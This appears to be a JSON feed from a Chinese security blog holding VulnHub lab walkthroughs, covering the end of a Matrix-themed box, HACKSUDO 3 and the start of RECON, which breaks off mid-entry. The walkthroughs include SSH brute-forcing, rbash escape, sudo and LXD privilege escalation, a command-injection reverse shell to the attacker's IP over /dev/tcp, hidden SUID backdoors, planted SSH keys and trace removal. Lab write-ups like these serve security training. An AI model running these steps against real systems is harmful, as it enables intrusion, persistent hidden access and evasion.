找到敏感目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cy9pbWcvcDBydF8zMTMzNy5wbmc=\">http://192.168.31.107/assets/img/p0rt_31337.png</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-131.png\" alt></p>\n<p>但是没有找到更多可以操作的，转到下个目标</p>\n<h3 id=\"31337-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#31337-网站信息收集\">#</a> 31337 网站信息收集</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-132.png\" alt></p>\n<p>这里有一个提示暗号的意思，右键检查源代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-133.png\" alt></p>\n<p>发现一串 base64 加密的字符，通过终端解密此密文</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&quot; | base64 -d</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-134.png\" alt></p>\n<p>-&gt; 得到文件名为 Cypher.matrix 的提示文件</p>\n<p>尝试访问 http://192.168.31.107:31337/Cypher.matrix</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-135.png\" alt></p>\n<p>下载后得到一个文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-136.png\" alt></p>\n<h3 id=\"brainfuck-解密\"><a class=\"markdownIt-Anchor\" href=\"#brainfuck-解密\">#</a> Brainfuck 解密</h3>\n<p>这是一个 brainfuck 加密，直接在线解密<br>\n解密网址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-137.png\" alt></p>\n<p>-&gt; 用户名:guest 密码：k1ll0rXX<br>\n 最后两位 XX 是未知的，需要进行爆破</p>\n<h3 id=\"crunch-生成字典\"><a class=\"markdownIt-Anchor\" href=\"#crunch-生成字典\">#</a> Crunch 生成字典</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看字典生成规则的lst文件</span></span><br><span class=\"line\">cat /usr/share/crunch/charset.lst ｜ grep lalpha</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-138.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ &gt; pass.dic</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Usage: crunch &lt;min&gt; &lt;max&gt; [options]. <span class=\"built_in\">where</span> min and max are numbers</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-f /path/to/charset.lst charset-name</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-139.png\" alt></p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> Hydra 爆破 SSH</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-l 指定用户guest -P 指定字典 -f 爆破密码成功后停止</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-vV 显示详细过程 -o将爆破成功信息保存到文件中</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-140.png\" alt></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-141.png\" alt></p>\n<p>-&gt; 用户名:guest 密码：k1ll0r7n</p>\n<h3 id=\"rbash逃逸\"><a class=\"markdownIt-Anchor\" href=\"#rbash逃逸\">#</a> Rbash 逃逸</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ssh登陆到此台服务器</span></span><br><span class=\"line\">ssh guest@192.168.31.107 k1ll0r7n</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-142.png\" alt></p>\n<p>发现此会话窗口是 rbash，即做了限制的 bash</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前环境变量</span></span><br><span class=\"line\">echo $PATH</span><br><span class=\"line\">echo /home/guest/prog/*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-143.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现当前只能使用vi，尝试使用vi逃逸rbash</span></span><br><span class=\"line\">vi test 然后ESC 接着:!/bin/bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-144.png\" alt></p>\n<p>rbash 成功升级为了 bash，但是很多命令还是没有</p>\n<h3 id=\"sudocp提权\"><a class=\"markdownIt-Anchor\" href=\"#sudocp提权\">#</a> sudo (cp) 提权</h3>\n<p>查看到正常机器上的 id 是在 /usr/bin 上，输入 /usr/bin/id 可以正常使用，而输入 id 无法正常访问，说明当前的会话窗口找不到 id 命令，要从环境变量中添加<br>\n <code>export PATH=/usr/bin:$PATH</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-145.png\" alt></p>\n<p>sudo -l 查看相关的权限设置<br>\n发现 trinity 可以无密码使用 /bin/cp<br>\ncp 提权说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY3Av\">https://gtfobins.github.io/gtfobins/cp/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /home/trinity/</span><br><span class=\"line\">sudo -u trinty /bin/cp /bin/sh evil</span><br><span class=\"line\">sudo -u trinty evil</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-146.png\" alt></p>\n<h3 id=\"root-权限问题提权\"><a class=\"markdownIt-Anchor\" href=\"#root-权限问题提权\">#</a> root 权限问题提权</h3>\n<p>sudo -l 发现可以由 root 执行 /home/thrity/oracle<br>\n 但是此文件在此目录中并不存在，复制出来 bash，并利用 root 执行此文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /bin/bash /home/thrity/oracle</span><br><span class=\"line\">sudo /home/thrity/oracle</span><br></pre></td></tr></table></figure>\n<p>输入 id 之后，可见成功提权至 root</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-147.png\" alt></p>\n<h3 id=\"sudo-su提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo-su提权\">#</a> sudo su 提权</h3>\n<p>当拿到 root 权限之后，习惯性的翻阅 /etc/sudoers 文件，发现此文件中授予了 guest 用户执行 root 的所有权限，意味着 guest 用户可以 sudo su 并输入自己的密码切换到 root 账户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/sudoers | grep &quot;ALL=(ALL) ALL&quot;</span><br><span class=\"line\">su guest</span><br><span class=\"line\">sudo su</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-148.png\" alt></p>\n<p>即意味着当得到 guest 用户 rbash 逃逸后，可以凭借 sudo su 直接提权为 root</p>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> suid 权限维持</h3>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tY2h6LmNvbS5jbi9jbi9zZXJ2aWNlL3NhZmV0eS1sYWIvaW5mb18yNl9pdGVtaWRfNDA2MC5odG1s\">http://www.mchz.com.cn/cn/service/safety-lab/info_26_itemid_4060.html</span></p>\n<p>在正常的机器上找到 useradd 与 passwd 的位置，将其目录添加到靶机的 PATH 中，添加 kali 用户，并复制 bash，添加 s 权限，隐藏后门，方便提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">靶机</span></span><br><span class=\"line\">export PATH=/usr/sbin:$PATH</span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\">cp /bin/bash /var/.hack</span><br><span class=\"line\">chmod 4755 /var/.hack</span><br><span class=\"line\">ls -Alh /var/.hack</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击机</span></span><br><span class=\"line\">ssh kali@192.168.31.107</span><br><span class=\"line\">/var/.hack -p &amp; whoami</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-149.png\" alt></p>\n<p>-&gt; 可以通过 kali 用户直接登陆此台服务器，并且利用我们遗留在服务器上具有 s 权限的后门文件进行升级 shell</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/103%20HACKSUDO/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/103%20HACKSUDO/",
            "title": "VULNHUB 3 HACKSUDO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tMyw2NzEv\">https://www.vulnhub.com/entry/hacksudo-3,671/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8=\">https://blog.csdn.net/qq_45434762/article/details/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKSUDO：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-032.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-033.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.141</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.141 - oN /tmp/hacksudo.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-034.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"目录爆破并反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#目录爆破并反弹shell\">#</a> 目录爆破并反弹 shell</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQx\">http://192.168.31.141</span></p>\n<ol>\n<li>对此网站进行目录扫描<br>\n <code>dirsearch -u http://192.168.31.141</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-035.png\" width=\"350\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQxL2xvZ2luLnBocA==\">http://192.168.31.141/login.php</span> 尝试弱口令，万能密码均失败</p>\n<ol start=\"2\">\n<li>加载比较全面一点的字典，来扩大目录，看是否能得到更多的信息</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.141 -x php,txt,html,bak,zip -w</span><br><span class=\"line\">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-036.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQxL2dlbmVyYXRvci5waHAj\">http://192.168.31.141/generator.php#</span> 存在 REC 代码执行漏洞</p>\n<ol start=\"3\">\n<li>对 http://192.168.31.141/generator.php# 网站进行攻击</li>\n</ol>\n<p>疑似 figlet xx 的命令，构造 figlet xx&amp;ls 可执行更多的 linux 命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在此位置输入反弹shell的命令，并监听端口</span></span><br><span class=\"line\">nc lvvp 4444</span><br><span class=\"line\">1 &amp; bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-037.png\" width=\"500\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使终端窗口变为一个标准的终端</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; - &gt; ctrl+z</span><br><span class=\"line\">stty raw -echo;fg -&gt; enter,enter</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-038.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"凯撒加密\"><a class=\"markdownIt-Anchor\" href=\"#凯撒加密\">#</a> 凯撒加密</h3>\n<p>翻阅文件，这里找到一个类似于 “凯撒加密” 的文件</p>\n<p>提示：凯撒密码是一种位移加密方式，只对 26 个字母进行位移替换加密，规则简单。例如，当偏移量是 2 的时候，所有的字母 A 将被替换成 C，B 变成 D，以此类推。如果您输入的是中英文组合，则只会对英文加密解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-039.png\" alt></p>\n<p>在线进行凯撒解密，偏移为 13 ：<span class=\"exturl\" data-url=\"aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw\">http://moersima.00cha.net/kaisamima.asp</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-040.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解密后的数据为：</span></span><br><span class=\"line\">hacksudo locker SSH username:hacksudo</span><br><span class=\"line\">password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62 447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>\n<h3 id=\"sha-512加密\"><a class=\"markdownIt-Anchor\" href=\"#sha-512加密\">#</a> SHA 512 加密</h3>\n<p>密码又被进行了一层 hash 散列加密<br>\n在线 hash 解密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==\">https://crackstation.net/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-041.png\" alt></p>\n<p>-&gt; 得到 hacksudo 的用户名：hacksudo 密码：vishal</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆到此用户</span></span><br><span class=\"line\">su hacksudo </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-042.png\" alt></p>\n<h3 id=\"lxd-提权\"><a class=\"markdownIt-Anchor\" href=\"#lxd-提权\">#</a> LXD 提权</h3>\n<p>发现了 id 之后有 lxd 补充组，尝试 lxd 提权<br>\n lxd 提权指南：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LXVuaXgvcHJpdmlsZWdlLWVzY2FsYXRpb24vaW50ZXJlc3RpbmctZ3JvdXBzLWxpbnV4LXBlL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbg==\">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在kali机器上下载lxd的文件，并通过scp发送至靶机：</span></span><br><span class=\"line\">wget https://github.com/saghul/lxd-alpine-builder/archive/refs/heads/master.zip</span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/lxd/lxd /tmp/lxd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">自定义镜像</span></span><br><span class=\"line\">sed -i &#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-</span><br><span class=\"line\">releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27; build-</span><br><span class=\"line\">alpine</span><br><span class=\"line\">sudo ./build-alpine -a i</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">引入镜像</span></span><br><span class=\"line\">lxc image import alpine*.tar.gz --alias myimage</span><br><span class=\"line\">lxd init</span><br><span class=\"line\">lxc init myimage mycontainer -c security.privileged=true</span><br><span class=\"line\">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root</span><br><span class=\"line\">recursive=true</span><br><span class=\"line\">lxc start mycontainer</span><br><span class=\"line\">lxc exec mycontainer /bin/sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-044.png\" width=\"430\" alt=\"Image\">\n<h3 id=\"配置ssh-keygen维权\"><a class=\"markdownIt-Anchor\" href=\"#配置ssh-keygen维权\">#</a> 配置 ssh-keygen 维权</h3>\n<ol>\n<li>服务器操作</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成私钥和公钥：</span></span><br><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">保存公钥至认证文件：</span></span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>客户端操作：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载私钥：</span> </span><br><span class=\"line\">scp hacksudo@192.168.31.141:~/.ssh/id_rsa.</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">改变文件权限：</span></span><br><span class=\"line\">chmod 700 vulnhub_hacksudo</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">免密登陆服务器：</span></span><br><span class=\"line\">ssh hacksudo@192.168.31.141 -i ~/.ssh/vulnhub_hacksudo</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>靶机消除痕迹</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">销毁服务端的痕迹：</span></span><br><span class=\"line\">rm -f ~/.ssh/id_rsa &amp;&amp; rm -f ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-045.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 免密登陆 root 失败，但可以免密登陆账户 hacksudo</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下次登陆此服务器需要</span> </span><br><span class=\"line\">ssh hacksudo@192.168.31.141</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在hacksudo账户内使用如下命令可直接进入root</span></span><br><span class=\"line\">lxc exec mycontainer /bin/sh </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/107%20RECON/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/107%20RECON/",
            "title": "VULNHUB 7 RECON",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVjb24tMSw0Mzgv\">https://www.vulnhub.com/entry/recon-1,438/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzA2L3Z1bG5odWItcmVjb24tMS8=\">https://readysetexploit.wordpress.com/2022/03/06/vulnhub-recon-1/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-103.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.230</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.230 -oN /tmp/recon.txt</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-104.png\" alt></p>\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"wpscan-扫描-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-扫描-wordpress\">#</a> wpscan 扫描 wordpress</h3>\n<p>1）目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.230/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-105.png\" alt></p>\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocD9yZWRpcmVjdF90bz1odHRwJTNBJTJGJTJGMTkyLjE2OC4zMS4yMzAlMkZ3cC1hZG1pbiUyRiZhbXA7cmVhdXRoPTE=\">http://192.168.31.230/wp-login.php?redirect_to=http%3A%2F%2F192.168.31.230%2Fwp-admin%2F&amp;reauth=1</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==\">http://192.168.31.230/wp-login.php</span><br>\n 对此网址进行弱口令爆破，sql 注入均无效果</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-106.png\" alt></p>\n<ol start=\"2\">\n<li>wordpress 进行扫描用户</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取到wpscan的api token：</span></span><br><span class=\"line\">https://wpscan.com/profile?pricingList=1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令枚举wordpress的用户名：</span></span><br><span 